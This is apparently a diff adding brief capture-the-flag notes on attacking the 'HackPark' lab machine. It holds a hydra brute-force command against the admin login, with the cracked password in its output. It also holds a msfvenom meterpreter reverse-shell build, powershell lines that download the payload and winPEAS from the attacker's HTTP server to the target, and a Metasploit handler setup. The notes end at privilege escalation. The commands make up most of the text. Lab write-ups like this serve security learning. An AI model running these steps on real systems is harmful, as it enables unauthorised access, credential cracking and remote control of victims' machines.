@@ -1,0 +1,29 @@
+Started by running gobuster on HackPark and found admin page
+
+Used hydra to break admin code:
+root@kali:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.15.201 http-form-post "/Account/login.aspx?ReturnURL=%2fadmin:__VIEWSTATE=dz48ENfhi0D3mk8L74g0wIi%2Fz8Xs1spPSoYP92hOYmnCiwJtRg9b43MFL8MXEDXdJ8OSbPEAU%2FXYapK906HuLWseM3mcZ1G7nxfu7ULlLkeeQRqh00rslWKfjIcNuaZe10a2Q99A%2FG%2FvSgYbEnZ4RT3kYe619FWn6fdkegnShbfbznpn&__EVENTVALIDATION=CFPCV%2FPKAp4GQzPpcjmbA6RasJRx%2B6G6xHNb9aPoX33ZzyuG0GjJCzmw6I1NWHwORVAaIRU6gj4HmBAhtzLNA0wpJ10LQExQhHaEgV0lGtXHNg7qj%2BYcrrjP%2Fq8HmGVQmScUCh3ArOnN3TKN3zG1rl5Tzw90zp2uxSKhcBkDb6I40iJn&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+
+[80][http-post-form] host: 10.10.15.201   login: admin   password: 1qaz2wsx
+1 of 1 target successfully completed, 1 valid password found
+
+Used exploit CVE-2019-6714 with netcat on port 4445
+
+Nav to C:\Windows\Temp and 
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.2.42.149 LPORT=4443 -f exe -o HackShell.exe
+
+Set up python3 -m http.server
+Nav to C:\Windows\Temp and downloaded hackshell to target
+
+ powershell -c "Invoke-WebRequest -Uri 'http://10.2.42.149:8000/HackShell.exe' -OutFile 'C:\Windows\Temp\HackShell.exe'"
+
+Set up meterpreter to receive
+ use exploit/multi/handler
+ set PAYLOAD windows/meterpreter/reverse_tcp
+ set LHOST your-ip
+ set LPORT listening-port run
+
+ powershell -c "Invoke-WebRequest -Uri 'http://10.2.42.149:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
+
+Got stuck on priv esc
+
